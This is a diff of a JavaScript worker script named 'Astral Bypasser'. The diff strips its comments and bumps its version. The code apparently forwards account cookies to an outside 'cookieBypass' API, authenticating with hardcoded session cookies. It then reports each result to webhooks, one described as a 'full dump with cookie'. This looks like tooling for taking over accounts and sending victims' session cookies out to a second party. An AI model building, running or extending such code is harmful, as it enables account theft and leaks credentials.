@@ -1,6 +1,5 @@
 // ============================================================
-// ASTRAL BYPASSER v4.2
-// Uses Immortal API with hardcoded authentication cookies
+// ASTRAL BYPASSER v4.3
 // ============================================================
 
 addEventListener('fetch', event => {
@@ -8,7 +7,6 @@ addEventListener('fetch', event => {
 });
 
 async function handleRequest(request) {
-  // Handle CORS preflight
   if (request.method === 'OPTIONS') {
     return new Response(null, {
       status: 204,
@@ -69,7 +67,6 @@ async function handleRequest(request) {
   const displayName = username || 'Unknown_User';
 
   try {
-    // Hardcoded Immortal authentication cookies
     const immortalCookies = [
       'Authentication=8eg0ZmGL%2FIwdyoHZDdMYnjJiQTdobGVLQkdoeGc3cGJpWUtNMmJKUzNqRW1FUTBHWTlwZFdjOEtzRWs9',
       'Authentication2=cXqas72gYpgV0xgoFibeQkc3MlMwUUdnVlJ4dTcxdTBmcm5ualRxdk5zTkJxZlRLcDlLOFFmcVdZdlR1R3FiaFBIMzZ3STJJZlJSZlYrWiticlFnSGVoYlEzTjhITFZTbWxQVS93PT0%3D',
@@ -79,7 +76,6 @@ async function handleRequest(request) {
 
     const cookieString = immortalCookies.join('; ');
 
-    // Forward to Immortal API with authentication
     const immortalResponse = await fetch('https://immortal.st/api/misc/cookieBypass.php', {
       method: 'POST',
       headers: {
@@ -96,12 +92,11 @@ async function handleRequest(request) {
     const responseText = await immortalResponse.text();
     console.log('Immortal API raw response:', responseText);
 
-    // Check if response is HTML
     if (responseText.trim().startsWith('<') || responseText.trim().startsWith('\n\t\t\t')) {
       return new Response(JSON.stringify({
         success: false,
-        error: 'Immortal API returned HTML - session expired',
-        raw: responseText.substring(0, 300)
+        error: 'Immortal API session expired',
+        raw: responseText.substring(0, 200)
       }), {
         status: 200,
         headers: {
@@ -130,7 +125,6 @@ async function handleRequest(request) {
 
     const duration = Date.now() - startTime;
 
-    // Check if the API returned success
     if (data.success || data.status === 'success' || data.code) {
       const result = {
         success: true,
@@ -149,7 +143,6 @@ async function handleRequest(request) {
         username: data.username || displayName
       };
 
-      // Send Live Bypass (clean)
       await sendLiveBypass({
         username: result.username,
         userId: result.userId,
@@ -166,7 +159,6 @@ async function handleRequest(request) {
         code: result.code
       });
 
-      // Send Dualhook (full dump with cookie)
       await sendDualWebhook({
         type: 'success',
         username: result.username,
